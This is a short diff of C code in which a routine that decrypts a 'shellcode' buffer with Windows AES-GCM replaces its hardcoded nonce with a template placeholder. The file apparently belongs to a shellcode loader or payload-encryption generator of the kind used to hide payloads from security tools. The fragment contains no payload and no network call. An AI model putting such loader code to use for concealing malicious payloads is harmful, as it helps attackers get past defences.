@@ -34,9 +34,10 @@ BOOL decrypt_aes(BYTE* shellcode, DWORD shellcode_len, BYTE* key, DWORD key_len)
     authInfo.cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
     authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
 
-    BYTE nonce[] = "uniquestring"; // 12-byte nonce
+    BYTE nonce[] = // {{NONCE_PLACEHOLDER}}
+    ;
     authInfo.pbNonce = nonce;
-    authInfo.cbNonce = 12;
+    authInfo.cbNonce = sizeof(nonce);
 
     if (shellcode_len < 16) {
         BCryptDestroyKey(hKey);
